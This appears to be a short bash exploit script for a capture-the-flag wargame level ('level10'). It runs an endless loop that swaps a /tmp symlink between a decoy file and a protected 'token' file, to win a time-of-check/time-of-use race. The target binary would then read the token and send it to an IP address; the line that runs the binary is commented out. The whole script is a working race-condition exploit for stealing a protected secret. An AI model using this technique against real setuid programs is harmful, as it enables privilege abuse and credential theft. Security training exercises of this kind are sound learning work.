#!/bin/bash

FICHIER_ORIGINAL="/home/user/level10/token"
FICHIER_PIEGE="/dev/shm/piege"
LIENSYM="/tmp/lien"
ADRESSE_IP="192.168.122.1"

rm -f $LIENSYM
while true; do
        ln -s /dev/shm/piege $LIENSYM
    #./level10 $LIENSYM $ADRESSE_IP
        rm -f $LIENSYM
        ln -s $FICHIER_ORIGINAL $LIENSYM
        rm -f $LIENSYM

done